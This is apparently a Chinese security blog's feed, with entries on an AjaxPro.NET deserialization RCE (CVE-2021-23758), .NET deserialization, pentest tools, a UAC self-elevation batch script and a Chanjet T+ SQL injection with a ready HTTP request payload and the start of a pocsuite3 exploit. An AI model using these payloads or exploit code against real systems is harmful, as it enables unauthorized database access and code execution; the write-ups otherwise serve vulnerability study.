</span><br><span class="line"></span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run()</span><br><span class="line"> AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context)</span><br></pre></td></tr></table></figure><h4 id="堆栈-漏"><a href="#堆栈-漏" class="headerlink" title="堆栈&amp;漏"></a>堆栈&amp;漏</h4><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>从上面分析可知，如果要控制反序列化操作的 <code>Type</code>，那么必须保证 Ajax 处理函数的输出参数类型是可控的，而 <code>GetStoreWarehouseByStore</code> 函数的输入参数为 <code>Objectt</code> 类型，符合当前漏洞要求：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416155500241.png" class="" title="GetStoreWarehouseByStore"><p>修改请求数据包，加入<code>__type</code>参数，并加入<code>ObjectDataProvider</code>利用链，发送数据包后成功触发RCE。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416162012157.png" class="" title="image-20240416162012157"><p>发送 Ajax 请求后，首先会进入继承于 <code>IHttpHandler</code> 接口的类 <code>AjaxSyncHttpHandler</code>，调用函数 <code>ProcessRequest</code> 进行处理：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416144921138.png" class="" title="ProcessRequest"><p>接着进入<code>XmlHttpRequestProcessor.RetreiveParameters</code>函数：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416145606460.png" class="" title="RetreiveParameters"><p>其中第23行通过<code>method.GetParameters</code>加载自定义的全部Ajax Method，即所有采用<code>[AjaxPro.AjaxMethod]</code>进行装饰的函数，比如本次漏洞的 <code>GetStoreWarehouseByStore</code> 方法：</p><p>上述 parameters 的类型为:</p><p><code>&#123;System.Reflection.RuntimeParameterInfo&#125;System.Reflection.ParameterInfo &#123;System.Reflection.RuntimeParameterInfo&#125;</code></p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150109088.png" class="" title="parameters"><p>自定义的 方法：</p><p>((System.Reflection.RuntimeMethodInfo)parameters[0].MemberImpl).m_name &#x3D; “GetStoreWarehouseByStore”</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150303537.png" class="" title="image-20240416150303537"><p>接着往下走，第120行通过<code>JavaScriptDeserializer.DeserializeFromJson</code>反序列化得到一个<code>JavaScriptObject</code>对象，这里指定了<code>Type</code>类型，继续往下看：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150611131.png" class="" title="DeserializeFromJson"><p>进入 <code>JavaScriptDeserizlizer.Deserializer</code> ：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416150859147.png" class="" title="JavaScriptDeserizlizer.Deserializer"><p>这里判断是否存在<code>__type</code>参数，如果存在且通过<code>__type</code>获取的<code>Type</code>对象继承于处理函数输入参数数据类型（<code>type.IsAssignableFrom(t)</code>），可以修改反序列化的<code>type</code>对象。继续往下走，最终调用<code>DeserializeCustomObject</code>函数完成处理，处理过程与.NET JavaScriptSerializer等其他反序列化方式非常类似。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240416151403563.png" class="" title="image-20240416151403563"><p>在新版本的 <code>AjaxPro.Net</code> 中，对自定义反序列化类型的操作加入了配置限制，只有预先配置好的<code>Type</code>类型才能进行修改，导致恶意类无法被插入。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/image-20240418092602485.png" class="" title="Add Type Check">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述： CVE-2021-23758 Ajax.NET Professional 中的RCE 漏洞 分析及说明&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
    <category term="漏洞" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>【.Net】反序列化漏洞探索</title>
    <link href="http://example.com/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A2%E7%B4%A2/"/>
    <id>http://example.com/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A2%E7%B4%A2/</id>
    <published>2024-04-15T10:27:03.494Z</published>
    <updated>2024-04-18T08:13:00.782Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：.Net 反序列及漏洞相关自洽记录。</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="开源项目和文章推荐"><a href="#开源项目和文章推荐" class="headerlink" title="开源项目和文章推荐"></a>开源项目和文章推荐</h2><p>项目：</p><ol><li><a href="https://github.com/Ivan1ee/NET-Deserialize/tree/master">Ivan1ee&#x2F;NET-Deserialize: 总结了 20+.Net 反序列化文章，持续更新</a></li></ol><p>文章：</p><ol><li><a href="https://cn-sec.com/archives/675298.html">【最新漏洞预警】开源组件漏洞之 CVE-2021-23758 AjaxPro.NET 反序列化漏洞 | CN-SEC 中文网</a></li><li><a href="https://www.h3c.com/cn/d_202112/1519681_30003_0.htm">AjaxPro.NET 反序列化漏洞(CVE-2021-23758)-新华三集团-H3C</a></li></ol><h2 id="反序列化说明"><a href="#反序列化说明" class="headerlink" title="反序列化说明"></a>反序列化说明</h2><p>在 .NET 中，反序列化漏洞通常是由于不安全地处理序列化的数据而产生的。当应用程序反序列化来自不受信任来源的数据时，攻击者可能会构造恶意的序列化数据，从而在反序列化过程中触发任意代码执行或其他恶意行为。</p><p>.NET 框架提供了多种序列化机制，如二进制格式化程序（BinaryFormatter）、SOAP 格式化程序（SoapFormatter）、数据契约序列化程序（DataContractSerializer）等。这些序列化机制在默认情况下可能不安全，因为它们可能允许攻击者利用某些类型的安全漏洞。</p><h2 id="Net-反序列化常见相关函数"><a href="#Net-反序列化常见相关函数" class="headerlink" title=".Net 反序列化常见相关函数"></a>.Net 反序列化常见相关函数</h2><p>目前已经有发现的相关反序列漏洞涉及的函数包括但不限于以下所示相关函数：</p><ol><li>XmlSerializer</li><li>NetDataContractSerializer</li><li>FastJson</li><li>BinaryFormatter</li><li>Json.Net</li><li>.Net Remoting</li><li>SoapFormatter</li><li>DataContractSerializer </li><li>LosFormatter</li><li>ObjectStateFormatter <a href="%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.md">【.Net】可执行文件结构分析.md</a> </li><li>JavaScriptSerializer</li></ol><h2 id="堆栈实例"><a href="#堆栈实例" class="headerlink" title="堆栈实例"></a>堆栈实例</h2><p>可查看文章 <a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/" title="【CVE-2021-23758】Ajax .NET Professional 中的RCE 漏洞">【CVE-2021-23758】Ajax .NET Professional 中的RCE 漏洞</a> 中的分析。关键调用如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) </span><br><span class="line">AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) </span><br><span class="line">AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() </span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() </span><br><span class="line">AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：.Net 反序列及漏洞相关自洽记录。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="B_Code" scheme="http://example.com/categories/B-Code/"/>
    
    <category term="CSharp" scheme="http://example.com/categories/B-Code/CSharp/"/>
    
    
    <category term=".Net" scheme="http://example.com/tags/Net/"/>
    
  </entry>
  
  <entry>
    <title>【工具】YaKit 单兵渗透测试工具</title>
    <link href="http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</id>
    <published>2024-04-11T16:00:00.000Z</published>
    <updated>2024-04-16T01:32:50.487Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：单兵作战渗透工具介绍——Yakit</p></blockquote><span id="more"></span><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://www.yaklang.io/products/download_and_install/#download">下载安装与更新配置 | Yak Program Language</a></p><h2 id="使用探索"><a href="#使用探索" class="headerlink" title="使用探索"></a>使用探索</h2><h3 id="poc-如何使用"><a href="#poc-如何使用" class="headerlink" title="poc 如何使用"></a>poc 如何使用</h3><p>渗透测试同居 -&gt; Web Fuzzer -&gt; 把相应的 POC 代码粘贴到 Request 中，然后店家发送请求即可。</p><img src="/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91YaKit%20%E5%8D%95%E5%85%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20240415105106436.png" class="" title="image-20240415105106436">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：单兵作战渗透工具介绍——Yakit&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="G_工具" scheme="http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="POC" scheme="http://example.com/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>【批处理】获取 UAC 权限</title>
    <link href="http://example.com/A_OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/%E3%80%90%E6%89%B9%E5%A4%84%E7%90%86%E3%80%91%E8%8E%B7%E5%8F%96uac%E6%9D%83%E9%99%90/"/>
    <id>http://example.com/A_OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/%E3%80%90%E6%89%B9%E5%A4%84%E7%90%86%E3%80%91%E8%8E%B7%E5%8F%96uac%E6%9D%83%E9%99%90/</id>
    <published>2024-04-09T09:37:41.349Z</published>
    <updated>2024-04-12T06:47:24.767Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：批处理获取UAC权限脚本</p></blockquote><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exist <span class="string">&quot;%SystemRoot%\system32\atl100.dll&quot;</span> (</span><br><span class="line">    ::xcopy atl100.dll D:\ /-y</span><br><span class="line">    ::<span class="built_in">echo</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">        xcopy atl100.dll C:\Windows\System32 /-y </span><br><span class="line">        regsvr32 atl100.dll /n /i</span><br><span class="line">     )</span><br><span class="line"></span><br><span class="line">setlocal</span><br><span class="line"><span class="built_in">set</span> uac=~uac_permission_tmp_%random%</span><br><span class="line">md <span class="string">&quot;%SystemRoot%\system32\%uac%&quot;</span> 2&gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 (</span><br><span class="line">    rd <span class="string">&quot;%SystemRoot%\system32\%uac%&quot;</span> &gt;nul 2&gt;nul ) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> <span class="built_in">set</span> uac = CreateObject^(<span class="string">&quot;Shell.Application&quot;</span>^)&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> uac.ShellExecute <span class="string">&quot;%~s0&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;runas&quot;</span>,1 &gt;&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> WScript.Quit &gt;&gt;<span class="string">&quot;%temp%\%uac%.vbs&quot;</span></span><br><span class="line">    <span class="string">&quot;%temp%\%uac%.vbs&quot;</span> /f</span><br><span class="line">    del /f /q <span class="string">&quot;%temp%\%uac%.vbs&quot;</span> &amp; <span class="built_in">exit</span> )</span><br><span class="line">endlocal</span><br><span class="line"></span><br><span class="line">:Run</span><br><span class="line">:: 下面代码替换为自己的</span><br><span class="line">regsvr32 <span class="string">&quot;%~dp0%LockKeys.dll&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：批处理获取UAC权限脚本&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="批处理" scheme="http://example.com/categories/A-OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【WIN】DeskBand 扫盲</title>
    <link href="http://example.com/A_OS/Windows/DeskBand/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/"/>
    <id>http://example.com/A_OS/Windows/DeskBand/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/</id>
    <published>2024-04-09T09:31:12.470Z</published>
    <updated>2024-04-16T01:32:55.987Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：Windows DeskBand 开发的知识点及项目介绍</p></blockquote><span id="more"></span><p>[toc]</p><h2 id="DeskBand"><a href="#DeskBand" class="headerlink" title="DeskBand"></a>DeskBand</h2><p>DeskBand 指 Windows 操作系统上工具栏按钮，可以通过在工具栏添加按钮来添加一些功能。如下图所示360开发的DeskBand——360U盘助手。</p><img src="/A_OS/Windows/DeskBand/%E3%80%90Win%E3%80%91DeskBand%20%E6%89%AB%E7%9B%B2/image-20240409174239559.png" class="" title="image-20240409174239559"><h2 id="开发说明"><a href="#开发说明" class="headerlink" title="开发说明"></a>开发说明</h2><p>参考文章：</p><ul><li><a href="https://blog.csdn.net/leehong2005/article/details/8608783">DeskBand实现之——对象介绍-CSDN博客</a></li><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/iphlpapi/nf-iphlpapi-getiftable?redirectedfrom=MSDN">getIfTable 函数 (iphlpapi.h) - Win32 apps | Microsoft Learn</a></li></ul><h2 id="如何创建"><a href="#如何创建" class="headerlink" title="如何创建"></a>如何创建</h2><p>开源项目：</p><ul><li><a href="https://github.com/microsoft/Windows-classic-samples/tree/a47da3d4551b74bb8cc1f4c7447445ac594afb44/Samples/Win7Samples/winui/shell/shellextensibility/deskbands">Windows-classic-samples&#x2F;Samples&#x2F;Win7Samples&#x2F;winui&#x2F;shell&#x2F;shellextensibility&#x2F;deskbands at a47da3d4551b74bb8cc1f4c7447445ac594afb44 · microsoft&#x2F;Windows-classic-samples</a></li><li><a href="https://github.com/AzureGreen/NetView?tab=readme-ov-file">AzureGreen&#x2F;NetView: a deskband plus-in which can view real-time net speed</a></li><li><a href="https://github.com/slivermeteor/LockKeys">slivermeteor&#x2F;LockKeys: The windows explorer extension to show the status of Capslock and Numlock in the Taskbar.</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：Windows DeskBand 开发的知识点及项目介绍&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="DeskBand" scheme="http://example.com/categories/A-OS/Windows/DeskBand/"/>
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="DeskBand" scheme="http://example.com/tags/DeskBand/"/>
    
  </entry>
  
  <entry>
    <title>【工具】SFTP 工具分享</title>
    <link href="http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91SFTP%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/G_%E5%B7%A5%E5%85%B7/%E3%80%90%E5%B7%A5%E5%85%B7%E3%80%91SFTP%E5%B7%A5%E5%85%B7/</id>
    <published>2024-04-09T06:34:21.903Z</published>
    <updated>2024-04-12T06:47:10.423Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：用户本地搭建 SFTP 的小工具。</p></blockquote><span id="more"></span><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/175JTNcqm1lYkenGoDaRkCA?pwd=hi0w">https://pan.baidu.com/s/175JTNcqm1lYkenGoDaRkCA?pwd=hi0w</a><br>提取码：hi0w</p></blockquote><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>参考文章：</p><ul><li><a href="https://developer.aliyun.com/article/1348505#:~:text=%E5%A6%82%E4%BD%95%E5%9C%A8Windows%E6%9C%AC%E5%9C%B0%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BASFTP%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%AE%9E%E7%8E%B0%E5%85%AC%E7%BD%91%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%201%201.%20%E6%90%AD%E5%BB%BASFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%201.1%20%E4%B8%8B%E8%BD%BD%20freesshd%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BD%AF%E4%BB%B6%20%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%EF%BC%9A,%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E8%AE%BF%E9%97%AEcpolar%E7%9A%84%E5%AE%98%E7%BD%91%EF%BC%8C%E5%85%8D%E8%B4%B9%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8B%E8%BD%BD%E5%B9%B6%E5%AE%89%E8%A3%85windows%E7%89%88%E6%9C%AC%E7%9A%84cpolar%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E3%80%82%20...%204%204.%20%E4%BD%BF%E7%94%A8SFTP%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%8C%E8%BF%9E%E6%8E%A5%E5%85%AC%E7%BD%91%E5%9C%B0%E5%9D%80%E6%B5%8B%E8%AF%95%204.1%20%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%AB%99%E7%82%B9%20">如何在Windows本地快速搭建SFTP文件服务器，并通过端口映射实现公网远程访问-阿里云开发者社区</a></li><li></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：用户本地搭建 SFTP 的小工具。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="G_工具" scheme="http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>【QVD-2023-13612】畅捷通T+ SQL 注入漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/</id>
    <published>2024-04-07T00:22:33.512Z</published>
    <updated>2024-04-18T09:55:10.247Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：畅捷通T+ SQL 注入漏洞(含POC)</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><p>[toc]</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418160447555.png" class="" title="image-20240418160447555"><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>畅捷通T+SQL注入漏洞，未经身份认证的远程攻击者可在易受攻击系统上执行任意SQL语句，某些情况下攻击者利用该漏洞可在底层操作系统上执行shell命令。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>畅捷通T+ 13.0</p><p>畅捷通T+ 16.0</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: 192.168.19.137:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="使用-pocsuit"><a href="#使用-pocsuit" class="headerlink" title="使用 pocsuit"></a>使用 pocsuit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> OrderedDict, OptString</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChanJetPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span 